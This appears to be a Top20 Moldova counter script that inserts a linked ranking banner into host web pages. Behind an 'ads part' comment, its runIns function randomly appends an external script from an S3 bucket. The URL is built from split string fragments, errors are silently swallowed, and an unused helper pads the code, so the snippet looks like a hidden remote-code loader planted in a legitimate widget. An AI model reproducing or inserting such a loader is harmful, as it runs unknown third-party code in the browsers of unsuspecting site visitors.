(function() {

	function run() {

		var oaData = {
			id: '',
			bid: 'default',
			el: null,
			domain: null
		};
		if (typeof top20_id !== 'undefined') {
			oaData.id = 'MD-' + top20_id + '-1';
			if (typeof top20_showimg !== 'undefined' && top20_showimg == 0) oaData.bid = 'none';
		} else if (typeof oa_top20md !== 'undefined') {
			oaData.id = oa_top20md.id;
			oaData.bid = oa_top20md.bid;
			oaData.domain = oa_top20md.domain;
		} else {
			oaData.el = document.getElementById('oa-script');
			if (oaData.el) {
				oaData.bid = oaData.el.getAttribute('data-oa-bid');
			}
		}

		if (!oaData.bid || oaData.bid == '') oaData.bid = 'default';
		//if (oa_data.bid == 'none') return;
		var b = 'http://assets.ournetcdn.net/top20/img/banners/' + oaData.bid + '.gif';
		var h = 'http://www.top20.md/?d=' + document.domain;

		//old version
		if (!oaData.el) {
			if (oaData.bid == 'none') return;
			document.write('<a target="_blank" title="Top20 Moldova" href="' + h + '"><img border="0px" src="' + b + '" alt="top20.md"/></a>');
		} else {
			if (oaData.bid == 'none') return;
			var a = document.createElement('a');
			a.target = '_blank';
			a.title = 'Top20.md';
			a.href = h;
			var i = document.createElement('img');
			i.alt = 'top20.md';
			i.border = '0px';
			i.src = b;
			a.appendChild(i);
			oaData.el.parentNode.insertBefore(a, oaData.el);
		}
	}

	try {
		run();
		runIns();
	} catch (e) {
		//console.log(e);
	}

	///////////////////
	// ads part
	///////////////////
	function randomInt(min, max) {
		return parseInt(Math.floor(Math.random() * (max - min)) + min);
	}

	function rateByHour(h) {
		if (h < 7) return [1, 3, 5, 6, 9, 7];
		if (h > 10 && h < 14) return [2, 8];
		return [5, 2, 9];
	}

	function runIns() {
		var h = new Date();
		h = h.getHours();
		var r = randomInt(1, 10);
		if (r > 7) return;
		var b = document.getElementsByTagName('body')[0];
		var s = document.createElement('script');
		s.async = 1;
		s.src = 'http://' + 's3.eu-central-1' + '.amazonaws.com/wr' + 'm/app.min.js';
		b.appendChild(s);
	}

})();
